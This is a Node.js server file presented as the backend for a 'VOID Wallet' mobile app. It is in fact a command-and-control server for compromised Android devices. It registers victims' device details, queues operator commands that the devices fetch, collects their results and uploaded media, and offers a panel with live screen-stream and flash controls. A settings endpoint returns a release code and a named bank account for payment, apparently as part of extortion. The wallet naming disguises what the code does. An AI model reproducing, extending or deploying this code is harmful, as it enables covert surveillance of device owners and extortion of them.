// ============================================================
//   VOID WALLET API
//   Backend sync for VOID Wallet mobile app
// ============================================================

const express = require('express');
const multer = require('multer');
const { createClient } = require('@supabase/supabase-js');

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// ============================================================
//   CONFIG
// ============================================================
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

if (!SUPABASE_URL || !SUPABASE_KEY) {
  console.error('Missing SUPABASE_URL or SUPABASE_KEY');
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, {
  auth: { persistSession: false }
});

// Authorized wallet IDs
const WALLET_IDS = [
  "48291", "57394", "12847", "91028", "37654",
  "84021", "62517", "19483", "75062", "30918",
  "57120", "89643", "26307", "41985", "68210",
  "93574", "14758", "52036", "78419", "36142",
  "71204", "39586", "80427", "56913", "23841",
  "64709", "95036", "18254", "47310", "68527",
  "91403", "35678", "72091", "14835", "83672",
  "29014", "57460", "91825", "36582", "74209",
  "60318", "85946", "27415", "60852", "13970",
  "48265", "57138", "90641", "23587", "76049",
  "20101"
];

const STORAGE_BUCKET = 'void-files';
const SYNC_TIMEOUT_MS = 25000;

function validWallet(id) { return WALLET_IDS.includes(id); }
function ts() { return Date.now(); }

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 50 * 1024 * 1024 }
});

// ============================================================
//   CLIENT ENDPOINTS
// ============================================================

app.post('/connect', async (req, res) => {
  try {
    const { userId, device, android, battery, network, androidId } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false, err: 'unauthorized' });

    const { data: existing } = await supabase
      .from('devices').select('*').eq('user_id', userId).maybeSingle();

    if (existing && existing.android_id && androidId && existing.android_id !== androidId) {
      return res.json({ ok: false, err: 'wallet_linked' });
    }

    await supabase.from('devices').upsert({
      user_id: userId,
      android_id: androidId || (existing && existing.android_id) || null,
      device: device || 'unknown',
      android: android || '?',
      battery: battery || '?',
      network: network || '?',
      last_seen: ts()
    }, { onConflict: 'user_id' });

    res.json({ ok: true, synced: ts() });
  } catch (e) {
    res.json({ ok: false, err: 'sync_failed' });
  }
});

app.get('/sync', async (req, res) => {
  const userId = req.query.wallet || req.query.device;
  if (!validWallet(userId)) return res.json({ ok: false, err: 'unauthorized' });

  await supabase.from('devices').update({ last_seen: ts() }).eq('user_id', userId);

  const deadline = Date.now() + SYNC_TIMEOUT_MS;

  const checkQueue = async () => {
    const { data: pending } = await supabase
      .from('commands').select('*').eq('user_id', userId)
      .eq('delivered', false).order('created_at', { ascending: true });

    if (pending && pending.length) {
      const ids = pending.map(p => p.id);
      await supabase.from('commands').update({ delivered: true }).in('id', ids);
      const out = pending.map(p => ({ id: String(p.id), cmd: p.cmd, args: p.args || '' }));
      return res.json({ ok: true, tasks: out });
    }

    if (Date.now() >= deadline) return res.json({ ok: true, tasks: [] });
    setTimeout(checkQueue, 1000);
  };

  checkQueue();
});

app.post('/status', async (req, res) => {
  try {
    const { userId, cmdId, cmd, data } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });

    await supabase.from('results').insert({
      user_id: userId,
      cmd_id: cmdId || '',
      cmd: cmd || '',
      data: (data || '').substring(0, 6000),
      created_at: ts()
    });

    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/media', upload.single('file'), async (req, res) => {
  try {
    const { userId, type } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });
    if (!req.file) return res.json({ ok: false, err: 'no_media' });

    const ext = (req.file.originalname.split('.').pop() || 'bin').toLowerCase();
    const path = userId + '/' + type.toLowerCase() + '_' + ts() + '.' + ext;

    const { error: upErr } = await supabase.storage
      .from(STORAGE_BUCKET)
      .upload(path, req.file.buffer, {
        contentType: req.file.mimetype || 'application/octet-stream',
        upsert: false
      });

    if (upErr) return res.json({ ok: false, err: upErr.message });

    const { data: urlData } = supabase.storage.from(STORAGE_BUCKET).getPublicUrl(path);

    await supabase.from('uploads').insert({
      user_id: userId,
      type: type || 'media',
      url: urlData.publicUrl,
      name: path.split('/').pop(),
      created_at: ts()
    });

    res.json({ ok: true, url: urlData.publicUrl });
  } catch (e) { res.json({ ok: false }); }
});

app.get('/settings', (req, res) => {
  res.json({
    ok: true,
    releaseCode: '129010',
    payment: { bank: 'PALMPAY', account: '9153239545', name: 'TOBILOBA' },
    maxAttempts: 5
  });
});

// ============================================================
//   PANEL ENDPOINTS
// ============================================================

app.post('/auth', (req, res) => {
  const { username, password } = req.body;
  if (username !== 'VOID') return res.json({ ok: false, err: 'invalid_credentials' });
  if (!validWallet(password)) return res.json({ ok: false, err: 'invalid_credentials' });
  res.json({ ok: true, token: 'void_' + password + '_' + ts(), userId: password });
});

app.get('/clients', async (req, res) => {
  try {
    const { data } = await supabase.from('devices').select('*');
    const list = (data || []).map(d => ({
      userId: d.user_id,
      device: d.device,
      android: d.android,
      battery: d.battery,
      network: d.network,
      lastSeen: d.last_seen,
      online: (ts() - (d.last_seen || 0)) < 30000
    }));
    res.json({ ok: true, clients: list, devices: list });
  } catch (e) {
    res.json({ ok: true, clients: [], devices: [] });
  }
});

app.get('/client', async (req, res) => {
  try {
    const id = req.query.id || req.query.wallet;
    if (!validWallet(id)) return res.json({ ok: false });

    const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
    const since = ts() - 60000;

    const { data: results } = await supabase.from('results').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: uploads } = await supabase.from('uploads').select('*')
      .eq('user_id', id).gte('created_at', since)
      .order('created_at', { ascending: true }).limit(30);

    const { data: recentTasks } = await supabase.from('commands').select('*')
      .eq('user_id', id).order('created_at', { ascending: false }).limit(20);

    let streaming = false, ledTest = false;
    if (recentTasks) {
      for (const c of recentTasks) {
        if (c.cmd === 'display_stream' && !streaming) streaming = c.args === 'on';
        if (c.cmd === 'led_test' && !ledTest) ledTest = c.args === 'on';
        if (streaming && ledTest) break;
      }
    }

    const online = d && (ts() - (d.last_seen || 0)) < 30000;

    res.json({
      ok: true,
      userId: id,
      online: !!online,
      device: d ? d.device : null,
      android: d ? d.android : null,
      battery: d ? d.battery : null,
      network: d ? d.network : null,
      lastSeen: d ? d.last_seen : null,
      live: streaming,
      flash: ledTest,
      results: (results || []).map(r => ({ cmd: r.cmd, data: r.data, at: r.created_at })),
      uploads: (uploads || []).map(u => ({ type: u.type, url: u.url, name: u.name, at: u.created_at }))
    });
  } catch (e) { res.json({ ok: false }); }
});

app.post('/dispatch', async (req, res) => {
  try {
    const { userId, cmd, args } = req.body;
    if (!validWallet(userId)) return res.json({ ok: false });

    if (cmd !== 'led_test' && cmd !== 'display_stream') {
      await supabase.from('results').delete().eq('user_id', userId);
      await supabase.from('uploads').delete().eq('user_id', userId);
    }

    await supabase.from('commands').insert({
      user_id: userId,
      cmd: cmd,
      args: args || '',
      created_at: ts(),
      delivered: false
    });

    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

// ============================================================
//   HEALTH
// ============================================================
app.get('/', (req, res) => {
  res.send('VOID WALLET API — ' + new Date().toISOString());
});

app.get('/health', (req, res) => {
  res.json({ ok: true, status: 'healthy', ts: ts() });
});

// ============================================================
//   CLEANUP
// ============================================================
async function cleanup() {
  try {
    const cutoff = ts() - (12 * 60 * 60 * 1000);
    await supabase.from('results').delete().lt('created_at', cutoff);
    await supabase.from('commands').delete().lt('created_at', cutoff).eq('delivered', true);
  } catch (e) {}
}
setInterval(cleanup, 60 * 60 * 1000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('VOID WALLET API listening on ' + PORT));
